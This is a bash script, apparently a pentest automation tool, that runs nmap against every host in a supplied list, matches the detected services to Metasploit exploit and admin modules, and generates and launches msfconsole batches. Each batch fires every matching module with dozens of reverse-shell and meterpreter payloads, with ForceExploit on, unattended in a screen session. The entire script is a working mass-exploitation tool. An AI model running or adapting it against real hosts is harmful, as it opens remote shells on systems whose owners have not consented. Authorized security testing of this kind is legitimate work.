#!/bin/bash 
# 20210523 kirby


if [[ ! -f "$1" ]]
then
    echo "must supply file of hosts"
    exit
fi

#ngrepfile=$(eval mktemp).nmap
cmdfile="${1}.msfcmd"
report="${1}.report"
lport=20000
srvport=2000
myip=$(ip addr show dev $(ip route |awk '/default/ {print $5}')|awk '/inet / {print $2}' |cut -d'/' -f1)
echo 'color false' > "$cmdfile"
BORDER='##################################################' 


function echocmd()
{
    for payload in \
        cmd/unix/pingback_bind \
        cmd/unix/pingback_reverse \
        cmd/unix/reverse \
        cmd/unix/reverse_awk \
        cmd/unix/reverse_bash \
        cmd/unix/reverse_bash_udp \
        cmd/unix/reverse_netcat \
        cmd/unix/reverse_openssl \
        cmd/unix/reverse_perl \
        cmd/unix/reverse_python \
        cmd/unix/reverse_ruby \
        cmd/windows/reverse_powershell \
        generic/shell_reverse_tcp \
        java/meterpreter/reverse_tcp \
        linux/aarch64/meterpreter/reverse_tcp \
        linux/aarch64/shell_reverse_tcp \
        linux/aarch64/shell/reverse_tcp \
        linux/x64/pingback_bind_tcp \
        linux/x64/pingback_reverse_tcp \
        linux/x86/meterpreter/reverse_tcp \
        multi/meterpreter/reverse_http \
        php/meterpreter/reverse_tcp \
        python/pingback_bind_tcp \
        python/pingback_reverse_tcp \
        python/shell_reverse_tcp \
        python/shell_reverse_udp \
        ruby/pingback_bind_tcp \
        ruby/pingback_reverse_tcp \
        ruby/shell_reverse_tcp \
        windows/meterpreter/reverse_tcp \
        windows/peinject/reverse_tcp \
        windows/peinject/reverse_tcp_dns \
        windows/pingback_bind_tcp \
        windows/pingback_reverse_tcp \
        windows/shell/reverse_nonx_tcp \
        windows/shell/reverse_tcp \
        windows/shell_reverse_tcp \
        windows/shell/reverse_tcp_dns \
        windows/shell/reverse_tcp_uuid \
        windows/shell/reverse_udp \
        windows/x64/encrypted_shell/reverse_tcp \
        windows/x64/peinject/reverse_tcp \
        windows/x64/pingback_reverse_tcp \
        windows/x64/shell/reverse_tcp \
        windows/x64/shell_reverse_tcp \
        windows/x64/shell/reverse_tcp_uuid
    do
        if [[ $module =~ 'windows' ]] && [[ ! $payload =~ 'windows' ]]
        then
            continue
        fi
        if [[ $module =~ 'linux' ]] && [[ $payload =~ 'windows' ]]
        then
            continue
        fi

        let lport++
        if [[ $lport == 65535 ]]
        then
            lport=20000
        fi
        while netstat -ant|grep LISTEN |grep ":$lport " >/dev/null 2>&1
        do
            let lport++
        done

        let srvport++
        if [[ $srvport == 9999 ]]
        then
            srvport=2000
        fi
        while netstat -ant|grep LISTEN |grep ":$srvport " >/dev/null 2>&1
        do
            let srvport++
        done

        if [[ $SSL == "false" ]]
        then
            TARGETURI="http://$host:$port"
        elif [[ $SSL == "true" ]]
        then
            TARGETURI="https://$host:$port"
        fi

        echo "echo \"$BORDER\"" >> "$cmdfile"
        echo "echo 'TESTING $host:$port'" >> "$cmdfile"
        echo "use $module" >> "$cmdfile"
        echo "set PAYLOAD $payload" >> "$cmdfile"
        echo "set RPORT $port" >> "$cmdfile"
        echo "set RHOSTS $host" >> "$cmdfile"
        echo "set RHOST $host" >> "$cmdfile"
        echo "set VERBOSE false" >> "$cmdfile"
        echo "set LPORT $lport" >> "$cmdfile"
        echo "set LHOST $myip" >> "$cmdfile"
        echo "set SRVPORT $srvport" >> "$cmdfile"
        echo "set SRVHOST $myip" >> "$cmdfile"
        echo "set SENDER_HOST_ADDRESS $myip" >> "$cmdfile"
        echo "set SSL $SSL" >> "$cmdfile"
        echo "set TARGETURI $TARGETURI" >> "$cmdfile"
        echo "set ForceExploit True" >> "$cmdfile"
        echo "exploit -j" >> "$cmdfile"
        echo "sleep .2" >> "$cmdfile"
    done

    echo "jobs" >> "$cmdfile"
    echo "sessions" >> "$cmdfile"
    echo "sleep 3" >> "$cmdfile"
}


for module in $(/usr/share/metasploit-framework/msfconsole \
    -q -n -x 'search exploit/; exit -y' \
    |sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" \
    |grep -v trans2open \
    |awk '{print $2}' \
    |egrep -i "exploit/" )
do
    EXPLOITS[${#EXPLOITS[@]}]=$module
done

for module in $(/usr/share/metasploit-framework/msfconsole \
    -q -n -x 'search auxiliary/admin; exit -y' \
    |sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" \
    |grep -v trans2open \
    |awk '{print $2}' \
    |egrep -i "auxiliary/admin" )
do
    AUXILADMIN[${#AUXILADMIN[@]}]=$module
done


shopt -s nocasematch
for host in $(cat "$1" |sort -u |egrep -v '^$|#')
do
    ngrepfile="${1}-${host}.ngrep"
    nmapfile="${1}-${host}.nmap"
    xmlfile="${1}-${host}.xml"
    if [[ ! -f "$ngrepfile" ]]
    then
        echo "Running nmap on $host"
        nmap -T4 --open -sV --version-all -p T:1-65535 -sT -oG "$ngrepfile" -oN "$nmapfile" -oX "$xmlfile" "$host" >/dev/null 2>&1
    fi
    IFS=$'\n'
    for line in $(egrep '\sPorts:\s' "$ngrepfile" |sed -e 's/.*Ports: //')
    do   
        IFS=','
        for fields in $line
        do   
            portinfo=()
            IFS='/'
            for d in $fields
            do   
                portinfo[${#portinfo[@]}]="$d"
            done 
            IFS=$'\n'
            port="${portinfo[0]// /}"
            state=${portinfo[1]}
            protocol=${portinfo[2]}
            owner=${portinfo[3]}
            service=${portinfo[4]}
            rpc_info=${portinfo[5]}
            version=${portinfo[6]}

            if [[ $state =~ filtered ]]
            then 
                continue
            fi   

            if [[ $service =~ ssl ]]
            then
                SSL='true'
            else
                SSL='false'
            fi

            for scanthis in \
                Apache \
                axis \
                bmc \
                cassandra \
                cisco \
                citrix \
                coldfusion \
                Consul \
                docker \
                elastic \
                ftp \
                git \
                JBoss \
                jdwp \
                Jenkins \
                jetty \
                Jira \
                juniper \
                mongo \
                mq \
                MySQL \
                nagios \
                nrpe \
                PHP \
                Postgres \
                redis \
                Samba \
                Solr \
                smb \
                smtp \
                squid \
                teamcity \
                Tomcat \
                veritas \
                Weblogic \
                zabbix \
                zookeeper
            do
                if [[ $version =~ "$scanthis" ]] \
                || [[ $service =~ "$scanthis" ]]
                then
                    echo "Found $scanthis on $host:$port"
                    for module in ${EXPLOITS[@]}
                    do
                        if [[ $module =~ "$scanthis" ]]
                        then 
                            echocmd
                        fi
                    done
                    echo "Found $scanthis on $host:$port"
                    for module in ${AUXILADMIN[@]}
                    do
                        if [[ $module =~ "$scanthis" ]]
                        then 
                            echocmd
                        fi
                    done
                fi
            done

            if [[ $version =~ 'Java' ]] \
            || [[ $version =~ 'RMI' ]] \
            || [[ $version =~ 'JMX' ]]
            then
                for module in \
                    exploit/multi/misc/java_jmx_server \
                    exploit/multi/misc/java_rmi_server
                do
                    echocmd
                done
            fi


            # COMMENT OUT TO RUN THESE
            continue


            if [[ $service =~ 'http' ]]
            then
                echo "Found $service on $host:$port"
                for module in ${EXPLOITS[@]}
                do
                    if [[ $module =~ "exploit/multi/http" ]] \
                    || [[ $module =~ "exploit/linux/http" ]] \
                    || [[ $module =~ "exploit/unix/http" ]] \
                    || [[ $module =~ "exploit/unix/webapp" ]] 
                    then 
                        echocmd
                    fi
                done
                for module in ${AUXILADMIN[@]}
                do
                    if [[ $module =~ "auxiliary/admin/http" ]]
                    then 
                        echocmd
                    fi
                done
            fi
        done
    done
done
#echo "exit" >> "$cmdfile"
for i in {1..60}
do
    echo "jobs" >> "$cmdfile"
    echo "sessions" >> "$cmdfile"
    echo "sleep 10" >> "$cmdfile"
done
echo "Running msf scan"
echo "Outputing to $report"
echo "View screen to monitor progress"
screen -O -dmS mkmsfscan -L -Logfile "$report" /usr/share/metasploit-framework/msfconsole -q -n -r "$cmdfile"
screen -list 
